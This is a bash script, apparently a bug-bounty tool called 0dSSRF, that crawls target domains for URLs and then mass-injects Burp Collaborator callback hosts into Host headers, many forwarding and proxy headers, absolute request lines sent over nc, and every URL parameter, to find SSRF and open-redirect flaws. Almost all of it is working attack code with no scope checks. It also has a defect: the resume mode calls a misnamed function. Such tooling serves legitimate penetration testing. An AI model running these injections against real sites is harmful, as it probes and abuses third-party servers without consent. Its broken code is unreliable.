#!/bin/bash

# Define colors for output
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
light_blue='\033[0;94m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Info
# This tool is to test SSRF and Open Redirect vulnerabilities
# Created by Kariem Gamal (0d.MErCiFul) from 0dYSs3y.? team

# Function to print the intro message
print_intro() {
  echo -e "${GREEN} _______  ______            _______  _______  ______                _____  ${NC}"
  echo -e "${GREEN}(  ___  )(  __  \ |\     /|(  ____ \(  ____ \/ ___  \ |\     /|    / ___ \ ${NC}"
  echo -e "${GREEN}| (   ) || (  \  )( \   / )| (    \/| (    \/\/   \  \( \   / )   ( (   ) )${NC}"
  echo -e "${GREEN}| |   | || |   ) | \ (_) / | (_____ | (_____    ___) / \ (_) /     \/  / / ${NC}"
  echo -e "${GREEN}| |   | || |   | |  \   /  (_____  )(_____  )  (___ (   \   /         ( (  ${NC}"
  echo -e "${GREEN}| |   | || |   ) |   ) (         ) |      ) |      ) \   ) (          | |  ${NC}"
  echo -e "${GREEN}| (___) || (__/  )   | |   /\____) |/\____) |/\___/  /   | |    _     (_)  ${NC}"
  echo -e "${GREEN}(_______)(______/    \_/   \_______)\_______)\______/    \_/   (_)     _   ${NC}"
  echo -e "${GREEN}                                                                      (_)  ${NC}"
  echo -e ""
  echo -e "${YELLOW}                         Welcome To 0dSSRF👑, ${NC}"
  echo -e ""
  echo -e ""
}

# intro function
print_intro


# Function to resume scanning from the last logged line for the first three stages [h,e,a]
continue_Function() {
  local file="$1"
  local log_file="$2"

  # Check if the file exists
  if [[ ! -f "$log_file" ]]; then
    echo -e "${RED}[*] Error: Log file not detected. Scanning process will start from the beginning. ${NC}"
    Started="false"
    return 1
  else
    Started="true"
  fi

  # Retrieve the last scanned line and update progress
  line_text=$(tail $log_file -n 1 | cut -d " " -f 7)
  # Read the file line by line and write only lines below the specified line
  awk -v line="$line_text" '{ if (NR >= FNR && $0 == line) { found=1; next } if (found) print }' $file > "./$log_dir/continue_list"
  echo -e "${GREEN}[*] Lines above the line containing ${YELLOW}'$line_text' ${GREEN}removed from file '$file', And will continue scanning ${YELLOW}$(wc -l < "./$log_dir/continue_list") ${GREEN}URLS.${NC}"
}

# Function to resume parameter injection scanning
continue_Parms() {
  local C_Domain="$1"
  local log_file="$2"

  # Check if parameter injection has already started
  if grep -i "injecting Burp Collaborator into $C_Domain parameters..." "$log_file" > /dev/null; then
    echo -e "${GREEN}[*] Starting resuming scanning for $C_Domain ${NC}"
    last_endpoint=$(tail $log_file -n 2 | head -n 1 | cut -d "?" -f 1 | cut -d "?" -f 1 | cut -d " " -f 7)
    awk -v line="$last_endpoint" '{ if (NR >= FNR && $0 ~ line) { found=1; next } if (found) print }' ./log_$log_time/0dSSRF_$C_Domain/filtered_params.txt > "./$log_dir/continue_parms"
    Parms="./$log_dir/continue_parms"
    counter=$(grep -nre "$last_endpoint" ./log_$log_time/0dSSRF_$C_Domain/filtered_params.txt | cut -d: -f1)
    return 1
  fi

  # checks if gau didn't start 
  if ! grep -i "Extracted URLs from gau for $C_Domain" "$log_file" > /dev/null; then
    echo -e "${GREEN}[*] Starting Extracting URLs from gau for $C_Domain ${NC}"
    printf $C_Domain | gau --subs --o ./log_$log_time/0dSSRF_$C_Domain/gau.output --blacklist ttf,woff,svg,png,gif,jpeg,css,js
    echo -e "${GREEN}[*] Extracted URLs from gau for $C_Domain ${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
  fi

  # checks if waymore didn't start 
  if ! grep -i "Extracted URLs from waymore for $C_Domain" "$log_file" > /dev/null; then
    echo -e "${GREEN}[*] Starting Extracting URLs from waymore for $C_Domain ${NC}"
    printf $C_Domain | waymore -mode U -oU ./log_$log_time/0dSSRF_$C_Domain/waymore.output -nd > /dev/null
    echo -e "${GREEN}[*] Extracted URLs from waymore for $C_Domain ${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
  fi

  # checks if katana didn't start 
  if [ "$Crawling_Mode" == "true" ] && [ ! $(grep -i "Crawling on $C_Domain Finished" "$log_file" 2> /dev/null) ]; then
    # resume from httpx step
    if ! grep -i "targets from $C_Domain" "$log_file" > /dev/null; then
      cat $list | grep $C_Domain | sort -u > ./log_$log_time/0dSSRF_$C_Domain/Crawling_Targets.txt
      # chech for live Targets and start crawling
      echo -e "${light_blue}[*] Check for live targets from $C_Domain${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
      cat ./log_$log_time/0dSSRF_$C_Domain/Crawling_Targets.txt | httpx -o ./log_$log_time/0dSSRF_$C_Domain/httpx.output -silent 1>/dev/null
      echo -e "${light_blue}[*] Crawling Now on $(wc -l < ./log_$log_time/0dSSRF_$C_Domain/httpx.output) targets from $C_Domain, It may take time...${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
      cat ./log_$log_time/0dSSRF_$C_Domain/httpx.output | katana -o ./log_$log_time/0dSSRF_$C_Domain/katana.output -silent -jc 1>/dev/null
      echo -e "${GREEN}[*] Crawling on $C_Domain Finished${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
      rm ./log_$log_time/0dSSRF_$C_Domain/Crawling_Targets.txt
    fi
    # resume from katana step
    if ! grep -i "Crawling on $C_Domain Finished" "$log_file" > /dev/null; then
      # rsume katana with -resume option. (not good)
      #katana -o ./log_$log_time/0dSSRF_$C_Domain/katana.output -silent -resume $(ls ~/.config/katana/ -t | head -n 1)
      cat ./log_$log_time/0dSSRF_$C_Domain/httpx.output | katana -o ./log_$log_time/0dSSRF_$C_Domain/katana.output -silent -jc 1>/dev/null
      echo -e "${GREEN}[*] Crawling on $C_Domain Finished${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
      rm ./log_$log_time/0dSSRF_$C_Domain/Crawling_Targets.txt
    fi
  fi

  # checks if urls have not filtered 
  if ! grep -i "Collecting Parms from $C_Domain ${YELLOW}finished${NC}" "$log_file" > /dev/null; then
    echo -e "${GREEN}[*] Starting filtering output files for $C_Domain ${NC}"
    cat ./log_$log_time/0dSSRF_$C_Domain/gau.output ./log_$log_time/0dSSRF_$C_Domain/waymore.output | uro > ./log_$log_time/0dSSRF_$C_Domain/all_urls.log
    rm ./log_$log_time/0dSSRF_$C_Domain/gau.output ./log_$log_time/0dSSRF_$C_Domain/waymore.output
    cat ./log_$log_time/0dSSRF_$C_Domain/all_urls.log | grep -o '.*\?.*=.*' > ./log_$log_time/0dSSRF_$C_Domain/all_params
    cat ./log_$log_time/0dSSRF_$C_Domain/all_params | uro -b jpg png js pdf css jpeg gif svg ttf woff > ./log_$log_time/0dSSRF_$C_Domain/filtered_params.txt && echo -e "${GREEN}[*] Collecting Parms from $C_Domain ${YELLOW}finished${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
    echo "">> ./log_$log_time/0dSSRF_$C_Domain/filtered_params.txt
    Parms="./log_$log_time/0dSSRF_$C_Domain/filtered_params.txt"
  fi
}

# Function to inject Host header
inject_host_header() {
  echo -e "${light_blue}[*] Injecting Burp Collaborator into Host header...${NC}"
  # For Counter
  counter=0
  total_urls=$(wc -l < "$list")

  if [[ "$Continue" == "true" ]]; then
    Continue_Function "$list" "./$log_dir/inject_host_header.log"
    if [[ "$Started" == "true" ]]; then
      counter=$(grep -nre "$line_text" $list | cut -d: -f1)
      local list="./$log_dir/continue_list"
    fi
  fi

  while IFS= read -r domain; do
    # Check if the domain is empty
    if [[ -z "$domain" ]]; then
      continue
    fi
    UD=$(echo "$domain" | awk -F'[://" ]+' '{print $2}'| tr . -)
    current_time=$(date +"%H:%M:%S")
    # Increment the counter
    counter=$((counter + 1))
    # Send the HTTP GET request using curl (background) with additional headers
    curl $domain -m 10 -H "Host: h--$UD.$Collab" &> /dev/null &
    # Print the processed domain for reference
    echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a ./log_$log_time/inject_host_header.log
    # Wait for $Delay seconds before next iteration
    sleep $delay
  done < "$list"
  echo -e "${GREEN}✅ Injecting Burp Collaborator into Host header ${YELLOW}Finished ${NC}"
}

# Function to inject into common headers
inject_common_headers() {
  echo -e "${light_blue}[*] Injecting Burp Collaborator into common headers...${NC}"
  # For Counter
  counter=0
  total_urls=$(wc -l < "$list")

  if [[ "$Continue" == "true" ]]; then
    Continue_Function "$list" "./$log_dir/inject_common_headers.log"
    if [[ "$Started" == "true" ]]; then
      counter=$(grep -nre "$line_text" $list | cut -d: -f1)
      local list="./$log_dir/continue_list"
    fi
  fi

  while IFS= read -r domain; do
    # Check if the domain is empty
    if [[ -z "$domain" ]]; then
      continue
    fi
    current_time=$(date +"%H:%M:%S")
    UD=$(echo "$domain" | awk -F'[://" ]+' '{print $2}'| tr . -)
    # Increment the counter
    counter=$((counter + 1))
    # Send the HTTP GET request using curl (background) with additional headers
    curl $domain/test -m 10 -H "From: root@From--$UD.$Collab" -H "User-Agent: Mozilla/5.0 root@User-Agent--$UD.$Collab" -H "Referer: http://Referer--$UD.$Collab/ref" -H "X-Original-URL: http://X-Original-URL--$UD.$Collab/" -H "X-Wap-Profile: http://X-Wap-Profile--$UD.$Collab/wap.xml" -H "Profile: http://Profile--$UD.$Collab/wap.xml" -H "X-Arbitrary: http://X-Arbitrary--$UD.$Collab/" -H "X-HTTP-DestinationURL: http://X-HTTP-DestinationURL--$UD.$Collab/" -H "X-Forwarded-Proto: http://X-Forwarded-Proto--$UD.$Collab/" -H "Origin: http://Origin--$UD.$Collab/" -H "X-Forwarded-Host: X-Forwarded-Host--$UD.$Collab" -H "X-Host: X-Host--$UD.$Collab" -H "Proxy-Host: Proxy-Host--$UD.$Collab" -H "Destination: Destination--$UD.$Collab" -H "Proxy: http://Proxy--$UD.$Collab/" -H "X-Forwarded-For: X-Forwarded-For--$UD.$Collab" -H "Contact: root@Contact--$UD.$Collab" -H "Forwarded: for=Forwardedfor--$UD.$Collab;by=Forwardedby--$UD.$Collab;host=Forwardedhost--$UD.$Collab" -H "X-Client-IP: X-Client-IP--$UD.$Collab" -H "Client-IP: Client-IP--$UD.$Collab" -H "True-Client-IP: True-Client-IP--$UD.$Collab" -H "CF-Connecting_IP: CF-Connecting-IP--$UD.$Collab" -H "X-Originating-IP: X-Originating-IP--$UD.$Collab" -H "X-Real-IP: X-Real-IP--$UD.$Collab" &> /dev/null &    
    # Print the processed domain for reference
    echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a ./log_$log_time/inject_common_headers.log
    # Wait for $Delay seconds before next iteration
    sleep $delay
  done < "$list"
  echo -e "${GREEN}✅ Injecting Burp Collaborator into common headers ${YELLOW}Finished ${NC}"
}

# Function to inject into absolute URL
inject_absolute_url() {
  echo -e "${light_blue}[*] Injecting Burp Collaborator into absolute URL...${NC}"
  # For Counter
  counter=0
  total_urls=$(wc -l < "$list")

  if [[ "$Continue" == "true" ]]; then
    Continue_Function "$list" "./$log_dir/inject_absolute_url.log"
    if [[ "$Started" == "true" ]]; then
      counter=$(grep -nre "$line_text" $list | cut -d: -f1)
      local list="./$log_dir/continue_list"
    fi
  fi

  while IFS= read -r domain; do
    # Check if the domain is empty
    if [[ -z "$domain" ]]; then
      continue
    fi
    current_time=$(date +"%H:%M:%S")
    U_Domain=$(echo "$domain" | awk -F'[://" ]+' '{print $2}')
    UD=$(echo "$domain" | awk -F'[://" ]+' '{print $2}'| tr . -)
    # Increment the counter
    counter=$((counter + 1))
    # Send the row HTTP GET request using nc (background)
    echo -e "GET http://a--$UD.$Collab/ HTTP/1.1\r\nHost: $U_Domain\r\n" | timeout 5 nc -q 1 $U_Domain 80  &> /dev/null &
    echo -e "GET http://a--$UD.$Collab/ HTTP/2\r\nHost: $U_Domain\r\n" | timeout 5 nc -q 1 $U_Domain 443 &> /dev/null &
    echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a ./log_$log_time/inject_absolute_url.log
    # Wait for $Delay seconds before next iteration
    sleep $delay
  done < "$list"
  echo -e "${GREEN}✅ Injecting Burp Collaborator into absolute URL ${YELLOW}Finished ${NC}"
}

# Function to handle the "-e" option
handle_e_option() {
  cat $list | awk -F'[://" ]+' '{print $2}' | sort -u > domains.txt
  grep -o '[^./]*\.[^./]*$' domains.txt | sort -u > ./log_$log_time/main_Domains.txt
  rm domains.txt
  # Call the main function
  inject_url_parameters
}

# Function to gather URLs and inject into parameters
inject_url_parameters() {
  while IFS= read -r main_Domain; do
    counter=0

    if [ "$Continue" == "true" ] && [ -d "./$log_dir/0dSSRF_$main_Domain" ]; then
      continue_Parms "$main_Domain" "./log_$log_time/inject_url_parameters.log"
    else
      #making dir for results
      mkdir ./log_$log_time/0dSSRF_$main_Domain
      echo -e "${light_blue}[*] Gathering URLs from $main_Domain...${NC}"
      # Extracting URLs with gau
      printf $main_Domain | gau --subs --o ./log_$log_time/0dSSRF_$main_Domain/gau.output --blacklist ttf,woff,svg,png,gif,jpeg,css,js
      echo -e "${GREEN}[*] Extracted URLs from gau for $main_Domain ${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
      # Extracting URLs with waymore
      printf $main_Domain | waymore -mode U -oU ./log_$log_time/0dSSRF_$main_Domain/waymore.output -nd > /dev/null
      echo -e "${GREEN}[*] Extracted URLs from waymore for $main_Domain ${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
      # Extracting URLs with katana
      if [[ "$Crawling_Mode" == "true" ]]; then
        # Get Targets from original list
        cat $list | grep $main_Domain | sort -u > ./log_$log_time/0dSSRF_$main_Domain/Crawling_Targets.txt
        # chech for live Targets and start crawling
        echo -e "${light_blue}[*] Check for live targets from $main_Domain${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
        cat ./log_$log_time/0dSSRF_$main_Domain/Crawling_Targets.txt | httpx -o ./log_$log_time/0dSSRF_$main_Domain/httpx.output -silent 1>/dev/null
        echo -e "${light_blue}[*] Crawling Now on $(wc -l < ./log_$log_time/0dSSRF_$main_Domain/httpx.output) targets from $main_Domain, It may take time...${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
        cat ./log_$log_time/0dSSRF_$main_Domain/httpx.output | katana -o ./log_$log_time/0dSSRF_$main_Domain/katana.output -silent -jc 1>/dev/null
        echo -e "${GREEN}[*] Crawling on $main_Domain Finished${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
        rm ./log_$log_time/0dSSRF_$main_Domain/Crawling_Targets.txt
      fi
      # Filtering tools output
      cat ./log_$log_time/0dSSRF_$main_Domain/gau.output ./log_$log_time/0dSSRF_$main_Domain/waymore.output | uro > ./log_$log_time/0dSSRF_$main_Domain/all_urls.log
      rm ./log_$log_time/0dSSRF_$main_Domain/gau.output ./log_$log_time/0dSSRF_$main_Domain/waymore.output
      cat ./log_$log_time/0dSSRF_$main_Domain/all_urls.log | grep -o '.*\?.*=.*' > ./log_$log_time/0dSSRF_$main_Domain/all_params
      cat ./log_$log_time/0dSSRF_$main_Domain/all_params | uro -b jpg png js pdf css jpeg gif svg ttf woff > ./log_$log_time/0dSSRF_$main_Domain/filtered_params.txt && echo -e "${GREEN}[*] Collecting Parms from $main_Domain ${YELLOW}finished${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
      echo "">> ./log_$log_time/0dSSRF_$main_Domain/filtered_params.txt
      local Parms="./log_$log_time/0dSSRF_$main_Domain/filtered_params.txt"
    fi

    echo -e "${light_blue}[*] injecting Burp Collaborator into $main_Domain parameters...${NC}" | tee -a ./log_$log_time/inject_url_parameters.log
    total_urls=$(wc -l < "./log_$log_time/0dSSRF_$main_Domain/filtered_params.txt")
    # Loop through each URL in the file
    while IFS= read -r url; do
      # Skip empty lines
      if [[ -z "$url" ]]; then
        continue
      fi
      # Extract parameters and inject separately
      IFS='&' read -r -a params <<< "$(echo "$url" | grep -oP '(?<=\?).*')"
      UD=$(echo "$url" | awk -F'[://" ]+' '{print $2}'| tr . -)
      # Base URL without parameters
      base_url=$(echo "$url" | grep -oP '^[^?]+')
      p=0
      counter=$((counter + 1))
      # Loop through each parameter
      for param in "${params[@]}"; do
        # Extract key and value
        key=$(echo "$param" | cut -d'=' -f1)
        value=$(echo "$param" | cut -d'=' -f2)
        current_time=$(date +"%H:%M:%S")
        p=$((p + 1))
        # Construct new URL with the parameter injected
        new_url="$base_url?$(echo "$url" | grep -oP '(?<=\?).*' | sed "s|$key=$value|$key=http://p--$UD.$Collab/?vulnerable_url=$base_url%26vulnerable_param=$key%26time=$current_time|")"
        # Send the request
        curl -L $new_url -m 10 &> /dev/null &
        echo -e "${light_blue}[$counter/$total_urls](p$p) ${YELLOW}$current_time ${NC}- Sent request to: $new_url" | tee -a ./log_$log_time/inject_url_parameters.log
        sleep $delay
      done
    done < "$Parms"
    echo -e "${GREEN}✅ Injecting Burp Collaborator into parameters on $main_Domain ${YELLOW}Finished ${NC}"
  done < "./log_$log_time/main_Domains.txt"
}

# Parse command-line options
while getopts "hepaks:c:l:r:" opt; do
  case $opt in
    h) stages+=("host") ;;
    e) stages+=("headers") ;;
    a) stages+=("absolute") ;;
    p) stages+=("parameters") ;;
    k) Crawling_Mode="true" ;;
    s) delay=$(echo "scale=2; 1/$OPTARG" | bc) ;;
    c) Collab="$OPTARG" ;;
    l) list="$OPTARG" ;;
    r) log_dir="$OPTARG"
       Continue="true" ;;
    \?) echo "Invalid option -$OPTARG" >&2; exit 1 ;;
  esac
done

# Ensure required options are provided
if [ -z "$Collab" ] || [ -z "$delay" ] || [ -z "$list" ]; then
  echo "Usage: $0 -h|-e|-p|-a -l urls_list.txt -c collaborator_id -s requests_per_second"
  exit 1
fi

# create a new dir to store logs or continue on previous log file
if [[ "$Continue" != "true" ]]; then
  # Store results in log dire
  log_time=$(date +"%d-%m-%y_%H:%M:%S")
  mkdir log_$log_time
else
  # handle error
  if [[ ! -d "$log_dir" ]]; then
    echo -e "${RED}[*] ${YELLOW}$log_dir ${RED}not found, please make sure you log directory is correct.${NC}"
    exit 1
  fi
  log_time=$(echo "$log_dir" | sed 's/^log_//')
fi

# Run the selected stages
for stage in "${stages[@]}"; do
  case $stage in
    host) inject_host_header ;;
    headers) inject_common_headers "$Collab" ;;
    parameters) handle_e_option ;;
    absolute) inject_absolute_url ;;
  esac
done
